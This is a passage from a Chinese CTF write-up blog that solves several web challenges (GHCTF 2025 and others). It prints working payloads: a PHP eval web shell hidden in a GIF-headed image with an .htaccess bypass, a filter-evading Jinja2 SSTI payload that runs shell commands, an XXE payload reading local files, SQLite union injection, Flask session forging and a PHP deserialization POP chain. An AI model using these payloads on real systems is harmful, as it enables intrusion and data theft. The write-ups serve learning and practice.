class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:32607/&quot;</span>  <span class="comment"># 替换为实际题目URL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># 获取题目并计算答案</span></span><br><span class="line">    response = s.get(url)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    </span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    expression = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;challenge&#x27;</span>).text.strip()</span><br><span class="line">    result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提交答案</span></span><br><span class="line">    post_response = s.post(url, data=&#123;<span class="string">&#x27;value&#x27;</span>: result&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果成功,访问flag页面</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> post_response.text:</span><br><span class="line">        <span class="comment"># 打印原始响应内容以调试路径</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;提交成功后的响应内容:\n&quot;</span>, post_response.text)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取flag页面路径（例如从链接中获取）</span></span><br><span class="line">        flag_link = soup.find(<span class="string">&#x27;a&#x27;</span>, href=<span class="literal">True</span>, text=<span class="string">&#x27;Enter to get flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag_link:</span><br><span class="line">            flag_url = flag_link[<span class="string">&#x27;href&#x27;</span>]  <span class="comment"># 如相对路径需拼接完整URL</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;发现flag链接:&quot;</span>, flag_url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag_url = <span class="string">&quot;/flag&quot;</span>  <span class="comment"># 默认路径（可能需要调整）</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 访问Flag页面</span></span><br><span class="line">        flag_response = s.get(url + flag_url)  <span class="comment"># 根据实际路径调整</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG] Flag页面原始内容:\n&quot;</span>, flag_response.text)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 动态提取Flag（根据实际页面结构调整）</span></span><br><span class="line">        flag_soup = BeautifulSoup(flag_response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试多种可能的提取方式</span></span><br><span class="line">        flag = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 情况1：Flag在&lt;pre&gt;标签中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            flag_element = flag_soup.find(<span class="string">&#x27;pre&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag_element: </span><br><span class="line">                flag = flag_element.text.strip()</span><br><span class="line">        <span class="comment"># 情况2：Flag在&lt;div class=&quot;flag&quot;&gt;中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            flag_element = flag_soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag_element:</span><br><span class="line">                flag = flag_element.text.strip()</span><br><span class="line">        <span class="comment"># 情况3：直接全文匹配CTF&#123;...&#125;格式</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">import</span> re</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&#123;.*?&#125;&#x27;</span>, flag_response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功获取Flag:&quot;</span>, flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到Flag,请检查页面结构:\n&quot;</span>, flag_response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;提交失败,响应内容:&quot;</span>, post_response.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460090148-60689433-e3b1-4e98-a0d3-4a761e3e5a2f.png"></p><p>ds拯救了py脚本不会写的我</p><h2 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h2><p>代码：</p><p>分析一下,我们需要在&#x2F;admin的路由下进行session伪造,密钥为love,使得is_admin&#x3D;1,name&#x3D;sjx</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;love&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;role&#x27;</span>] = &#123;</span><br><span class="line">        <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;aiyamaya&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(role, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Without you, you are an intruder!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> role.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span> <span class="keyword">and</span> role.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;sjx&#x27;</span>:</span><br><span class="line">        flag = os.popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br><span class="line">        message = <span class="string">&quot;Oh, You get me! The flag is: %s&quot;</span> % flag</span><br><span class="line">        <span class="keyword">return</span> render_template_string(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: You don&#x27;t have the power!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>) </span><br></pre></td></tr></table></figure><p>命令行执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;role&#x27;: &#123;&#x27;is_admin&#x27;: 1, &#x27;name&#x27;: &#x27;sjx&#x27;&#125;&#125;&quot; --secret &#x27;love&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460090379-b9bff3a7-c3c7-44bc-96e9-132d70d5719f.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460090580-089fd4bd-5fed-40b4-87eb-540b666e0ea3.png"></p><p><a href="https://www.cnblogs.com/GTL-JU/p/16960460.html"><font style="color:#3370FF;">对flask session伪造的学习</font></a></p><h2 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h2><p>ez_http</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460090996-8d836e8c-c0d9-4841-99fc-6b46cc171454.png"></p><p>点击按钮,出现了tyctf,进行POST传参</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460091487-7557d451-0dc4-4624-9486-1c7729d1608e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460091983-27a8dafc-1c70-4b0b-8210-150f20c35664.png"></p><p>hhh&#x3D;abc</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460092452-bf789f28-ff9e-4e6f-be36-7b044a26b7b5.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460092851-60a5b91b-6f4e-4c42-9a59-6c52e46f3fdf.png"></p><p>该User-Agent</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460093353-f8035581-41d3-47fb-b589-d6cffa8ed0ba.png"></p><p>本地访问</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460093882-23e52c26-ee71-4b42-b460-397e9065d159.png"></p><p>该cookie</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460094368-32ce81c7-5165-4b4b-acf8-d9cb5d13458f.png"></p><h2 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h2><p>展示一下,说明jpg文件可以上传</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460094746-83c6e6aa-7cfe-4885-b42a-ccee003a56f2.png"></p><p>cmd.php不用想,肯定不行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460094962-5c16e052-96f8-45b2-a1b0-148a5a68646e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460095104-bb5cb588-787c-4cdc-a50b-0e2c10a4a393.png"></p><p>传个1.jpg,看看行不行</p><p>GIF89a  </p><script language='php'>@eval($_POST['1']);</script><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460095255-cf5d646e-ffea-45ea-a1ea-060df39162c0.png"></p><p>抓包</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460095448-5d47364f-b968-4e1c-8b50-e0107cc7d833.png"></p><p>改文件名,不行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460095679-4565930b-bac8-43c2-b054-68c0cb5725e4.png"></p><p>传.htaccess文件,原理：把1.jpg当作PHP文件进行运行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460095920-440b1328-0982-4191-81f8-a1513324462f.png"></p><p>蚁剑连接</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460096120-993c3ea7-72cf-4727-9839-3ae887ff00ce.png"></p><p>拿flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460096275-ea997f0a-c0d3-4b70-9ad0-dd5cbd769918.png"></p><h2 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h2><p>ez_php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&#x27;abc&#x27;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;cba&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中JSON（JavaScript Object Notation）是一种轻量级数据交换格式,它使用键值对结构：</p><p>{“x”: “cba”,”id”: 123,”flag”: true}</p><p>所以GETjson&#x3D;{“x”:”cba”},POSTid&#x3D;abc就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460096479-7a60f7d2-686a-4ff0-9557-ef4f8fe2da45.png"></p><h2 id="开发人员的小失误"><a href="#开发人员的小失误" class="headerlink" title="开发人员的小失误"></a>开发人员的小失误</h2><p>常见的sql文件或者扩展名：sql,zip,tar,txt,bak,old</p><p>扫目录就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460096715-75ccd3a8-c830-4539-82e9-4cafe2a3891e.png"></p><p>下载对应文件就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460096930-a9f3c3df-078b-4603-9f05-4e9212bdf89b.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025GHCTFwp</title>
      <link href="/2025/03/21/2025CTF/2025GHCTFwp/"/>
      <url>/2025/03/21/2025CTF/2025GHCTFwp/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978093558-1a738db1-953c-4f2e-b485-383d672cb111.png"></p><p>打开附件看看，发现只能上传txt,log,text,md,jpg,png,gif文件，过滤了_,,os__builtins__,subclasses,<strong>globals</strong>,flag这几个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978158104-b04c73d3-0a89-4ba8-aa41-57f6b845272a.png"></p><p>先试一下有没有回显</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978228391-12b3bfa1-119a-4ae1-be6a-d630914f1f0d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978245235-e972f08f-a1c6-4cb8-ba45-2b210a8a4974.png"></p><p>打开文件路径 </p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978254092-170ca6ae-948b-41ee-83d4-6fd293860931.png"></p><p>查看有回显。说明上传成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978281686-98deb6a7-fa40-45a2-8378-74d50c9f6ed1.png"></p><p>之前在寒假学习中，经过高人指点，fenjing上有一个用法</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978042716-f8000827-aaba-4b0b-ad5c-7df5a76eb57a.png"></p><p>所以直接把那几个拉进黑名单里</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741091737533-b8a1593f-3410-4cc7-b7ef-d75ec4114bd9.png"></p><p>跑出来一个playload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set ao = lipsum | escape | batch(22) | first | last %&#125; &#123;&#123; ((lipsum[ao+ao+&#x27;globals&#x27;+ao+ao][ao+ao+&#x27;builtins&#x27;+ao+ao][ao+ao+&#x27;import&#x27;+ao+ao](&#x27;os&#x27;)).popen(&#x27;cat /flag&#x27;)).read() &#125;&#125; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741091899220-a94327ef-68bc-4313-a3c5-9c6dc5b56cb2.png"></p><p>直接交看文件就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978173424-d6df2244-b46a-4a65-b603-442085534740.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978112476-a91a57ff-4645-4fce-87ed-f8d03be3f7fb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978043093-e996b277-68f5-4a58-a061-a26853fe2156.png"></p><h2 id="﹏"><a href="#﹏" class="headerlink" title="&gt;(&gt;﹏&lt;)"></a>&gt;(&gt;﹏&lt;)</h2><p>这一题感谢高人指点，要不，我什么都做不到……</p><p>进去发现是一段flack代码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087269003-17d5a9b4-14e0-4cac-ad66-eae49e49305f.png"></p><p>在源代码这里他会整理一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087358610-ac775f6e-f832-442d-a845-6f62d155c750.png"></p><p>审计一下代码发现在这个页面它会把代码显现出来，而在&#x2F;ghctf中它才是我们传入playload的界面</p><p>而在这个页面下先用post传参，用xml来接收并打印出来。</p><p>如果xml没有参数，那么就返回System is safe</p><p>如果有的话进入下一步：</p><p> parser &#x3D; etree.XMLParser(load_dtd&#x3D;True, resolve_entities&#x3D;True)</p><p>先是创建一个XML解释器对象，并配置其行为：(load_dtd&#x3D;True, resolve_entities&#x3D;True)</p><p>load_did&#x3D;True:允许解释器加载外部DTD（文档类型定义）文件。</p><p>其中DVD用于定义XML文档的结构与实体。如果XML包含&lt;!DOCTYPE[…]&gt;声明，解释器会尝试加载指定外部的DVD文件（如 <code>SYSTEM&quot;https://~~~~&quot;</code>)</p><p>resolve_entities&#x3D;True:允许解析XML实体（如&xxe;）</p><p>其中实体可以是预定义实体（如%lt; 表示&lt;)、自定义内部实体（如<!ENTITY foo "bar">）、或外部实体（如<!ENTITY xxe STSTEM "file:///etc/passwd">）</p><p> root &#x3D; etree.fromstring(xml, parser)</p><p>使用配置的parser解析传入的XML字符串xml，生成一个XML树对象root</p><p>解析器读取XML字符串，并验证其格式</p><p>若存在&lt;!DOCTYPE&gt;声明且load_did&#x3D;True，加载外部DVD</p><p>若存在实体且resolve_entities&#x3D;True，解析并替换所有实体（如把&xxe;换成文件内容）</p><p>将解析后的XML转化为树状结构，root是根节点</p><p>name&#x3D;root.find(‘name’).text</p><p>从XML树中找一个名为name的直接子元素，并获取其文件内容</p><p>root.find(‘name’)：使用ElementTree的find()方法，按标签名name搜索直接子元素。注意，它仅匹配直接子节点，区分大小写，且不支持XPath表达式</p><p> return name or None</p><p>返回<name>标签里的值或者什么都不返回</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087506887-edc73b67-bf69-43dd-bd20-3f9bfc8ead7a.png"></p><p>刚才上文提到使用post来传参的，先用一个简单的xml&#x3D;<root><name>Hello</name></root>试一下有没有回显</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089528540-2e3f961a-0831-4836-8ae3-60d9a7f9c523.png"></p><p>发现有回显，所以可以构造playload了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089670030-1b4deac9-b677-4fd6-85ce-7619d4628de6.png">直接上传不行，url编码一下得到</p><p>xml&#x3D;%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20data%20%5B%0A%</p><p>20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%3E%0A%5D%3E%0A%3Croot%3E%0A%20%20%3Cname%3E%26xxe%3B%3C%2Fname%3E%0A%3C%2Froot%3E</p><p>大功告成：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089762976-d85c87a0-72df-47d5-9abb-ef0d09e13061.png"></p><h2 id="GHCTF-2025-SQL"><a href="#GHCTF-2025-SQL" class="headerlink" title="[GHCTF 2025]SQL???"></a>[GHCTF 2025]SQL???</h2><p>学习文章:</p><p><a href="https://blog.csdn.net/yeyushengfano/article/details/146178894"><font style="color:#3370FF;">GHCTF2025-WEB新手向(?)解析-SQL???</font></a></p><p><a href="https://www.jianshu.com/p/db0124676ca9"><font style="color:#3370FF;">SQLite 数据库注入总结</font></a></p><p><a href="https://blog.csdn.net/qq_59468567/article/details/140819336"><font style="color:#3370FF;">WEB渗透Web突破篇-SQL注入（SQLite）</font></a></p><p><a href="https://blog.csdn.net/luoshabugui/article/details/108327936"><font style="color:#3370FF;">SQLite sqlite_master</font></a></p><p>判断回显显位数</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464492487-cae0da73-d9c9-4058-864f-76bfe937ffde.png"></p><p>6就不行了,所以是5位</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464492787-ff3c845c-b56f-4bdc-a824-8e6b735e674d.png"></p><p>成功显示</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493029-dd6feafc-436f-47b1-af51-232bae253870.png"></p><p>union select 1,2,3,4,sql from sqlite_master</p><p>其中sqlite_master 是 SQLite 数据库的系统表（类似于其他数据库的 information_schema），它存储了当前数据库中所有对象的元数据（如表、索引、视图、触发器等）。其结构如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493331-5f0b22e4-bb7f-47b0-952c-dd4b08d20547.png"></p><p>点击图片可查看完整电子表格</p><p>sql 是 sqlite_master 表中的一列，记录了创建数据库对象（如表、索引）时使用的 原始SQL语句。通过查询此字段，攻击者可以获取以下信息：</p><p>表结构：例如 CREATE TABLE users(id INT, name TEXT, password TEXT)，直接泄露字段名。</p><p>索引和约束：了解数据库的索引策略。</p><p>敏感逻辑：如触发器中可能包含的业务逻辑。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493588-a0694f9b-6d9e-49f8-8a81-01399a6cdb33.png"></p><p><font style="color:#8F959E;"></font></p><p>成功找到表和列名,直接查就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493948-cd883573-92f8-4fb3-a942-0549ddb28faa.png"></p><h2 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h2><p>先找入口，发现这里都是原生函数，并且这上面的$arg1,$day1什么的，应该就是链尾了。一般来说，针对反序列化的题目，一定要把链尾找到，所谓的链尾，就是我们实现恶意代码的地方。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494197-bc4a3c92-95f2-44bc-9154-277ddd0b6cb8.png"></p><p>该函数的魔术方法是__get()，从访问不可访问或不存在的数据就会触发__get()魔术方法</p><p>目前的链子：Mystery{__get()}</p><p>仔细看了以下源码，发现Philosopher中hey是不存在的值，所以就会触发__get()方法，此处有发现了__invoke()魔术方法，__invoke()方法是尝试将对象调用为函数时触发这个魔术方法</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494360-77132e71-ea2f-4722-8e0c-454a0f3f1a3c.png"></p><p>目前的链子：Philosopher{__invoke()}-&gt;Mystery{__get()}</p><p>在Warlord发现function原本是变量，但是被当成函数了，所以就触发了__invoke()方法，在此处又发现了__call()魔术方法，当对象访问⼀个不存在的方法,或者不可访问的方法时候触发</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494512-09eb0037-5cd9-40cd-b6de-a612e304a1ed.png"></p><p>目前的链子：Warlord{__call()}-&gt;Philosopher{__invoke()}-&gt;Mystery{__get()}</p><p>看了一遍发现Samurai中的add()比较奇怪，是个不存在的函数或魔术方法，自然就会触发__call魔术方法</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494666-cada9579-9bf5-4b60-9df0-94d52ce1aa0e.png"></p><p>在其中还有__toString魔术方法以及__set()魔术方法，</p><p>目前的链子：Samurai{__toString}-&gt;Warlord{__call()}-&gt;Philosopher{__invoke()}-&gt;Mystery{__get()}</p><p>__toString是在对象(指实例化类的变量)被当成字符串调用的时候触发&#x2F;&#x2F;echo，</p><p>__set()是在动态设置不可访问的属性时或未定义的属性时被调用</p><p>在CherryBlossom中就找到了，把fruit1当作了字符串，所以就会触发__toString魔术方法，</p><p>其中还有__distruct魔术方法。至此，一条pop链就很清晰了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494841-8cf74d8d-5deb-44eb-9e19-03d177b4f2d4.png"></p><p>链子：CherryBlossom{__distruct}-&gt;Samurai{__toString}-&gt;Warlord{__call()}-&gt;Philosopher{__invoke()}-&gt;Mystery{__get()}</p><p>接下来就是进行绕过双重md5了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AI写的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 